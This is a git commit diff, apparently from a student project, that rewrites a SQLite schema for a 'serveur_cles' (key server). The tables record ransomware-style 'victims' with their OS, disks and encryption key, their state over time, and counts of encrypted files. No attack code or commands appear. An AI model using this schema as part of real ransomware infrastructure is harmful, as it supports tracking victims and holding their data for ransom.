c3328370b581271deb7aad7a6f15dc284c9c9b4a
Mandarun-creator <g.mboma@student.helmo.be>
2025-07-17 17:15:41 +0200

    Add files via upload

--- serveur_cles/script/victims_schema.sql
+++ serveur_cles/script/victims_schema.sql
@@ -1,5 +1,26 @@
-drop table if exists decrypted;
-drop table if exists encrypted;
-drop table if exists states;
-drop table if exists victims;
+DROP TABLE IF EXISTS encrypted;
+DROP TABLE IF EXISTS states;
+DROP TABLE IF EXISTS victims;
 
+CREATE TABLE IF NOT EXISTS victims (
+    OS TEXT,
+    hash TEXT PRIMARY KEY,
+    disks TEXT,
+    key TEXT
+);
+
+CREATE TABLE IF NOT EXISTS states (
+    id_state INTEGER PRIMARY KEY AUTOINCREMENT,
+    hash_victim TEXT NOT NULL,
+    datetime TEXT,
+    state TEXT,
+    FOREIGN KEY (hash_victim) REFERENCES victims(hash)
+);
+
+CREATE TABLE IF NOT EXISTS encrypted (
+    id_encrypted INTEGER PRIMARY KEY AUTOINCREMENT,
+    hash_victim TEXT NOT NULL,
+    datetime TEXT,
+    nb_files INTEGER,
+    FOREIGN KEY (hash_victim) REFERENCES victims(hash)
+);
